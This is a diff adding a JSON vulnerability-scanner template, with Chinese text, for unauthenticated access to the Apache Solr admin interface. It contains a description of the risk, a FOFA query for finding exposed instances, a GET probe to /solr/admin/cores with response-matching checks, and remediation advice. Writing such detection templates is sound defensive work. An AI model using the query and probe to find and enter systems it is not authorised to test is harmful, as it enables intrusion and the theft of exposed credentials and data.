@@ -1,0 +1,39 @@
+{
+  "product": "Apache Solr",
+  "vul_name": "Apache Solr 未授权访问",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。Solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，设置getshell.",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"APACHE-Solr\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/ada-tina/articles/_solr.html",
+  "fix": [
+    "配置solr访问控制权限",
+    "禁止将solr暴露在公网"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/solr/admin/cores?indexInfo=false&wt=json"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "initFailures"
+        },
+        {
+          "body": "responseHeader"
+        }
+      ]
+    }
+  }
+}
